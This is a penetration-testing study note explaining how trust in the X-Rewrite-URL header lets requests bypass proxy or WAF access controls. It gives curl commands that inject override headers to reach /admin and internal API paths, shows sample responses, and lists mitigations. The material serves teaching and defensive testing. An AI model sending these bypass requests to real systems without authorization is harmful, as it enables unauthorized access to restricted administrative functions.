---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.07 X-Rewrite-URL — URL Override"
---

# 03.07 — X-Rewrite-URL

## What is it?

`X-Rewrite-URL` is a non-standard HTTP header historically used by Squid proxy, Microsoft IIS (with specific URL rewrite rules), and various web frameworks to preserve the original URL request path before rewriting took place. 

In a typical load-balanced or proxied infrastructure, a reverse proxy (like Squid, Nginx, or an Apache HTTP server) receives a client request, matches it against routing or security policies, and potentially rewrites the URL path before passing the request to a backend application server. To ensure the backend has visibility into the URL the client originally requested, the proxy may populate the `X-Rewrite-URL` header with that path.

However, if the backend routing or authorization engine uses `X-Rewrite-URL` to determine the target resource while the front-end proxy only checks the request line path, a security mismatch occurs. Attackers can exploit this mismatch to bypass access controls, accessing restricted resources through an authorized front-end path.

---

## Use Cases

### 1. Bypassing Reverse Proxy or Web Application Firewall (WAF) Access Controls
A reverse proxy or WAF might be configured to block access to sensitive endpoints like `/admin/dashboard` or `/api/v1/debug`. If the front-end proxy inspects only the URI path in the HTTP request line (e.g., `GET /`), it will permit the request. If the backend server trusts the `X-Rewrite-URL` header to route the request internally, it will serve `/admin/dashboard` or `/api/v1/debug`, bypassing the proxy's restriction.

### 2. Bypassing URL-Based Routing Logic in IIS/ASP.NET Applications
In some Microsoft IIS setups with URL Rewrite modules, the original client URL is stored in `X-Rewrite-URL` or `X-Original-URL`. If an ASP.NET application uses these headers to handle internal routing and privilege verification, an attacker can specify a public URL on the request line (e.g., `/public/index.html`) but set `X-Rewrite-URL` to a sensitive API endpoint. The IIS web server handles authentication based on the public URL (allowing it), but the application routes based on the header value, exposing the protected API.

---

## Commands

Test for URL override vulnerability using curl and proxy manipulation.

### 1. Basic URL Override Check
Send a request to a benign root path `/` but specify a restricted endpoint in the `X-Rewrite-URL` header:
```bash
curl -i -H "X-Rewrite-URL: /admin" https://target.local/
```

### 2. Testing API Bypass on Internal Paths
Attempt to access a restricted backend API route via an allowed public assets directory:
```bash
curl -i -H "X-Rewrite-URL: /api/v1/internal/users" https://target.local/static/favicon.ico
```

### 3. Combining Override Headers
Try using both `X-Rewrite-URL` and `X-Original-URL` simultaneously to increase the likelihood of matching different proxy and framework routing parsers:
```bash
curl -i -H "X-Original-URL: /admin/settings" -H "X-Rewrite-URL: /admin/settings" https://target.local/
```

---

## Sample Output

### Vulnerable Setup (Successful Access Control Bypass)
The application server responds with a `200 OK` and serves the contents of the administrative console, despite the request line target being `/`.
```http
HTTP/1.1 200 OK
Date: Tue, 16 Jun 2026 10:30:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1245
Connection: keep-alive
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

<!DOCTYPE html>
<html>
<head>
    <title>Admin Area</title>
</head>
<body>
    <h1>Administration Dashboard</h1>
    <p>Logged in as: Administrator</p>
    <!-- Administrative controls -->
</body>
</html>
```

### Secure Setup (Access Control Restricting Request)
The proxy or application ignores or strips the header, and correctly enforces access control based on the request URI or returns a forbidden status.
```http
HTTP/1.1 403 Forbidden
Date: Tue, 16 Jun 2026 10:30:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 81
Connection: close

{"error": "Forbidden", "message": "Access is denied for the requested resource."}
```

---

## How to Fix / Secure

To prevent routing override vulnerabilities:

| Risk | Fix / Mitigation |
|------|------------------|
| **Proxy allows client-supplied rewrite headers** | Configure reverse proxies, load balancers, and WAFs to strip `X-Rewrite-URL` (and `X-Original-URL`) from all incoming client requests before they reach the backend application. |
| **Trusting headers in application routing** | Update application code to ignore custom routing headers when resolving paths, and rely strictly on the standard request URI. |
| **Decoupled security context** | Do not rely solely on proxy-level path restrictions for security. Implement robust, endpoint-level authentication and authorization in the backend application. |

---

## Related Notes
- [[06 - X-Original-URL]] — same attack, different proxy
- [[01 - Host Header]] — other header-based bypass
- [[Module 03 - Access Control]] — access control bypass patterns
